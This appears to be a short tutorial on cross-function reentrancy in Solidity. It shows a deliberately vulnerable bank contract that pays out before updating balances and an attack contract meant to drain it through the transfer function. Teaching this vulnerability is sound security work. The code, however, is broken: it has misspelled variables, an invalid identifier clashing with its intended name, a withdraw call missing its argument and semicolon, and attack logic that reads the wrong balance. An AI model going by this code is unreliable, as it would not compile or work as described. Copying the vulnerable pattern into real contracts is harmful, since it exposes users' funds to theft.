## Cross Function Reentrancy

Lets go straight to an example contract

```solidity
//SPDX-License-Identifier:MIT

pragma solidity 0.8.18;

contract VulnerableBank {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier nonReentrant () {
        require(!locked, "wait this function is still processing");
        locked = true;
        _;

        locked = false;

    }

    function deposit () external payable {
        require(msg.value > 0, "Deposit amount must be greater than 0");
        balances[msg.sender] += msg.value;


    }

    function withdraw(uint256 amount) external nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal >= amount, "Insuficient balance");

        (bool sucess, ) = payable(msg.sender).call{value: amount} ("");
        require(success, "withdraw failed");

        balances[msg.sender] -= amount;

    }

    function transfer(address to, uint256 amount)  external {
        balances[msg.sender] -= amount;
        balances[to] += ampount;
    }
}

```

lets look at this vulnerable bank  and try to see what could go wrong 

1. The withdraw is using a modifier with means that this time the contract was keen to make sure that the withdraw function could not be reentered but lets take a look at this Attack contract and how  we can attack and drain funds from this contract.

```solidity
//SPDX-License-Identifier:MIT

pragma solidity 0.8.18;

import {VulnerableBank} from './VulnerableBank.sol'; // be sure you have the correct directory

contract Attack {

    VulnerableBank public target;
    address immutable 1_owner;


    constructor (address _target) {
        target = VulnerableBank(_target);
        i_owner = msg.sender;

    }

    function deposit() external payable {
        target.deposit{value: msg.value}();

    }

    function withdraw() external {
        target.withdraw()
    }

    receive() external payable {
        uint256 bal = target.balances(address(target));
        target.transfer(i_owner, bal);
    }

}


```